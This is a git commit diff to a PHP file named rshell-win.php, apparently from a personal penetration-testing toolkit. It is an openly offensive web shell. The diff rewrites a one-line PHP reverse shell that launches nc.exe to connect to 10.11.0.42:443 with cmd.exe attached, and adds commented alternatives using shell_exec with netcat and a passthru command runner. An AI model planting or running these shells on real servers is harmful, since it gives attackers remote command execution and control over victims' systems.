9c36ce091bdeda4b200f63a1be033363eac4a6dd
brian.lam <brian.lam38@gmail.com>
2022-02-06 20:19:59 -0500

    Updating tools

--- Tools/shells/rshell-win.php
+++ Tools/shells/rshell-win.php
@@ -1,3 +1,6 @@
-<?php
-exec('C:\Program Files\Femitter\Shared\Upload\nc.exe 10.11.0.42 443 -e cmd.exe');
-?>
+<?php exec('C:\Program Files\Femitter\Shared\Upload\nc.exe 10.11.0.42 443 -e cmd.exe');?>
+
+// OR TRY:
+// <?php echo shell_exec("nc 192.168.49.249 8080 -e cmd.exe"); ?>
+// <?php passthru("{command}"); ?>
+// ... search google for others
